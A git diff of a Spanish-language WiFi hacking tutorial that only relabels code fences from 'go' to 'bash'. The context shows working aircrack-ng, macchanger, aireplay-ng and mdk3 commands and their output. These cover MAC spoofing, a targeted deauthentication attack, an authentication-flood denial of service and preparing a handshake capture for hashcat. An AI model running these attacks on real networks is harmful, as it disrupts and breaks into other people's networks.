@@ -28,7 +28,7 @@ Tipos de ataques:
 
 Primero que todo debemos ponernos en modo monitor (modo para capturar todos los paquetes de red que viajan a nuestro alrededor). Primero matamos los procesos que molestan y son inecesarios en modo monitor:
 
-```go
+```bash
 # sudo airmon-ng check kill
 
 Killing these processes:
@@ -39,7 +39,7 @@ Killing these processes:
 
 Y activamos modo monitor:
 
-```go
+```bash
 # sudo airmon-ng start wlan0
 
 PHY	Interface	Driver		Chipset
@@ -51,7 +51,7 @@ phy0	wlan0		rtw_8821ce	Realtek Semiconductor Co., Ltd. RTL8821CE 802.11ac PCIe W
 
 Ya hemos activado el modo monitor. También podemos comprobarlo con:
 
-```go
+```bash
 # ifconfig wlan0
 
 wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
@@ -64,20 +64,20 @@ wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 ```
 En mi caso no cambia a **wlan0mon**, sino que el nombre se conserva ( **wlan0** ). Con modo monitor perdemos conexión a internet. Para volver a la normalidad hacemos:
 
-```go
+```bash
 sudo airmon-ng stop wlan0 && service NetworkManager restart
 ```
 ### Cambio de dirección MAC
 
 Primero debemos bajar la interfaz de red para poder monipular la MAC:
 
-```go
+```bash
 # sudo ifconfig wlan0 down
 ```
 
 Procedemos a cambiarla:
 
-```go
+```bash
 # sudo macchanger --mac=$(echo "$(macchanger -l | grep -i "national security agency" | awk '{print $3}'):da:1b:6a") wlan0
 
 Current MAC:   28:cd:c4:a5:38:6f (unknown)
@@ -89,14 +89,14 @@ New MAC:       00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
 
 Para registrar las redes wifi y estaciones(clientes) a nuestro alrededor, hacemos:
 
-```go
+```bash
 sudo airodump-ng wlan0
 ```
 
 
 Y empieza el modo monitor:
 
-```go
+```bash
 CH  2 ][ Elapsed: 1 min ][ 2021-12-28 16:12 
 
  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
@@ -255,13 +255,13 @@ fi
 
 Para usarlo primero debemos guardar los datos registrados en el analisis de entorno:
 
-```go
+```bash
 # sudo airodump-ng wlan0 -w Captura
 ```
 
 La primera vez que queramos ejecutar el script hacemos:
 
-```go
+```bash
 # chmod +x redeswifi-estaciones.sh
 
 # wget http://standards-oui.ieee.org/oui/oui.txt
@@ -269,7 +269,7 @@ La primera vez que queramos ejecutar el script hacemos:
 
 Lo ejecutamos:
 
-```go
+```bash
 # ./redeswifi-estaciones.sh Captura-01.csv 
 
 Número total de puntos de acceso: 8
@@ -336,7 +336,7 @@ Estaciones no asociadas:
 
 ### Fijar una red
 
-```go
+```bash
 # sudo airodump-ng -c 1 -w Captura --bssid F4:71:90:48:71:AC wlan0
 
  CH  1 ][ Elapsed: 42 s ][ 2021-12-28 16:40 
@@ -357,7 +357,7 @@ Estaciones no asociadas:
 
 **Ataque de deautenticación dirigido:** Tratamos de expulsar a una estación especifica de la red:
 
-```go
+```bash
 # sudo aireplay-ng -0 10 -a F4:71:90:48:71:AC -c 18:D6:1C:92:2A:E4 wlan0
 
 17:04:40  Waiting for beacon frame (BSSID: F4:71:90:48:71:AC) on channel 1
@@ -386,7 +386,7 @@ Estaciones no asociadas:
 
 **Ataque de autenticación:** Autentica muchos clientes y al final la red se vuelve lenta y expulsa a todos (DoS):
 
-```go
+```bash
 # sudo mdk3 wlan0 a -a F4:71:90:48:71:AC
 
 AP F4:71:90:48:71:AC is responding!           
@@ -437,7 +437,7 @@ Device is still responding with 10000 clients connected!
 
 Creamos un formato utilizable por hashcat:
 
-```go
+```bash
 # sudo aircrack-ng -j hashcatCapture Captura-01.cap
 
 Opening Captura-01.cape wait...
